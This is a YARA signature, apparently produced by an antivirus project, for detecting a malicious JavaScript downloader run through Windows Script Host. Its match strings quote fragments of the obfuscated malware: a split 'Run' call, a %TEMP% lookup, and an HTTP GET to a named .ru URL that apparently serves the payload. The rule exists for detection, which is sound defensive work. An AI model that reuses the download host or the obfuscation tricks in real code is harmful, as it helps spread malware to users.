rule sig_20160428_9c14cc8a4b1ce3fa546068bc7265c585 {
  meta:
    description = "datamaliciousorder - file 20160428_9c14cc8a4b1ce3fa546068bc7265c585.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c7242f3a482994b96cb63ba5d53e6ec34bc794e1b71d36bc80fb78b99a8e824b"

  strings:
    $s1  = "function EhhNbxDjtJesWcoMhvWtr(QwcJyhXnjDhjMquHfyYwp){EvhSbsGqcNouUaoGucVuc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function EhhNbxDjtJesWcoMhvWtr(QwcJyhXnjDhjMquHfyYwp){EvhSbsGqcNouUaoGucVuc[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function QmjAyhWgoWnpYvbUjyXbo() {return EvhSbsGqcNouUaoGucVuc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function XgoNsvTpmXzrDmqTlgGnd(VyvQkkBggNpdGfeRuhJgz, WlaDbpWiqEpkKjdYliDxe){XxcDdaPcfUijMejPwsHet = XxcDdaPcfUijMejPwsHet * 1; " ascii
    $s5  = "var EvhSbsGqcNouUaoGucVuc = function YbuKqfVleCpqQruJxiTto() {return WsvQabSemMdbYzfJevUdy[CcgJwoBtjNhvPcwQzhFyo](\"WScript\"+\"" ascii
    $s6  = "return VyvQkkBggNpdGfeRuhJgz - WlaDbpWiqEpkKjdYliDxe;};" fullword ascii
    $s7  = "RoxJiaEacJmsLwuXfsHso[EnpVckIyzVcuLhgRyxRoa](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s8  = "var EvhSbsGqcNouUaoGucVuc = function YbuKqfVleCpqQruJxiTto() {return WsvQabSemMdbYzfJevUdy[CcgJwoBtjNhvPcwQzhFyo](\"WScript\"+\"" ascii
    $s9  = "var WsvQabSemMdbYzfJevUdy = this[\"WScript\"];" fullword ascii
    $s10 = "function QmjAyhWgoWnpYvbUjyXbo() {return EvhSbsGqcNouUaoGucVuc[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (RoxJiaEacJmsLwuXfsHso[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function DulMjlPbmGquQmuZcnMek(){return UftFwzRxaJohSwsVjjFrb + \"\";};" fullword ascii
    $s13 = "function XgoNsvTpmXzrDmqTlgGnd(VyvQkkBggNpdGfeRuhJgz, WlaDbpWiqEpkKjdYliDxe){XxcDdaPcfUijMejPwsHet = XxcDdaPcfUijMejPwsHet * 1; " ascii
    $s14 = "function UgcMsyNmuRrvEvkQjzZvn() {return ((XmuRizSzcVirYrvLrbPlg == true) && (XmuRizSzcVirYrvLrbPlg == XpwBvbYrgVrwAdnTorSze)) ?" ascii
    $s15 = "function UgcMsyNmuRrvEvkQjzZvn() {return ((XmuRizSzcVirYrvLrbPlg == true) && (XmuRizSzcVirYrvLrbPlg == XpwBvbYrgVrwAdnTorSze)) ?" ascii
    $s16 = "function UfcFwdGzjYwdOvaFyrCmy(){return CcgJwoBtjNhvPcwQzhFyo;};" fullword ascii
    $s17 = "var LvxNsfOiiDlyMirUanZxg = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "return XgoNsvTpmXzrDmqTlgGnd(1 == 1 ? VfaMrhRziHdlDgtJxkZpa : 0, 1 == 1 ? RglBmxWvgGfaTdiPxaIpe : 0);" fullword ascii
    $s19 = "var FmgIgzTjdAjtEogSlfDnu = false;" fullword ascii
    $s20 = "XpwBvbYrgVrwAdnTorSze = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}